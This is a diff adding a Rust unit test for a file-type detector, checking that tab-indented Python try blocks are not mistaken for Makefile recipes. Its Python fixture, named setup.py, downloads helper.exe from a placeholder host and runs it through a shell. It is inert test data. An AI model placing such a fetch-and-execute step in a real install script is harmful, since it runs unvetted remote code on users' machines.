@@ -1929,6 +1929,16 @@ fn makefile_path_only_detection() {
 }
 
 #[test]
+fn tab_indented_python_try_suite_is_not_a_make_recipe() {
+    let source = b"import urllib.request\nfrom subprocess import run\ntry:\n\turllib.request.urlretrieve('https://updates.example.org/helper.exe', 'helper.exe')\n\trun(['start', 'helper.exe'], shell=True)\nexcept Exception as error:\n\tprint(error)\n";
+    assert_detect("setup.py", source, FileType::Python);
+    assert_detect("module.py", source, FileType::Python);
+    let make = b"try:\n\tpython -c 'import sys; print(sys.version)'\n";
+    assert_detect("Makefile", make, FileType::Makefile);
+    assert_detect("recipe.mk", make, FileType::Makefile);
+}
+
+#[test]
 fn makefile_content_overrides_signatureless_image_extensions() {
     let body = b"JPEG_INC ?= $(shell pkg-config --cflags libjpeg || echo)\nJPEG_LIB ?= $(shell pkg-config --libs libjpeg || echo -ljpeg)\n";
     for path in ["util/makefile.jpeg", "util/makefile.png"] {
